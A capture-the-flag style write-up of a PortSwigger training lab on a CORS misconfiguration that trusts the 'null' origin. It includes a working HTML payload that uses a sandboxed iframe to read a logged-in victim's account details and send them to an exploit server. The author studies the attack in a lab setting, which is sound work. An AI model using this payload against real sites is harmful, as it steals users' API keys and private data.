+++
date = '2026-07-07T10:39:16+08:00'
draft = false
title = "CORS vulnerability with trusted null origin | <span style=\"color:#2ecc71\">Apprentice</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Similar to [this lab](/training/portswigger/cors/cors_apprentice1), the session cookie still has `SameSite=None` and sensitive data is still stored at the `/accountDetails` endpoint. CORS may still be supported as the `Access-Control-Allow-Credentials` is set to True:
![](/images/viber_image_2026-07-07_10-19-29-856.png)
![](/images/viber_image_2026-07-07_10-20-24-697.png)

Let's try manipulating the Origin header, for example say `evil.com`?
![](/images/viber_image_2026-07-07_10-24-28-762.png)
The request is accepted? Yet there is no `Access-Control-Allow-Origin` header which means the origin is rejected? What does this mean? Turns out that CORS is enforced by the **victim's web browser**, and not the server. 

The thing about Burp Suite is that it's not a browser but a raw HTTP proxy, thus it doesn't enforce CORS policies in the headers. Looks like the origin is restricted tighter this time around.

But we haven't tried `null` yet. `null` may be whitelisted to support local application development, and *maybe* they forgot to remove it. Let's try this:
![](/images/viber_image_2026-07-07_10-33-26-829.png)
Turns out our intuition is right! And the reflected Origin header in the response confirms this. This means if we can somehow spoof our origin to `null` in our payload, then we can extract all those sensitive data.

With all these in mind, we can craft the following payload:
```html
<html>
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://<lab-id>.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
    location='https://<exploit-server>/exploit?key='+this.responseText;
    };
    </script>"></iframe>
</html>
```
This logic is the same as [the last lab](/training/portswigger/cors/cors_apprentice1), but this time the payload is inside a sandboxed `iframe`. When an `iframe` is sandboxed, the browser treats the origin of the frame as fuzzy, `null` if I may. Since a sandboxed `iframe` is very restricted in its actions, specialised flags are added in the `sandbox` attribute to grant it permission to perform certain actions.

After delivering our payload to the victim, the log will once again capture the sensitive data being sent over. Decoding this will get us the victim's apiKey. Very interesting!
![](/images/viber_image_2026-07-07_10-36-07-257.png)
![](/images/viber_image_2026-07-07_10-36-24-437.png)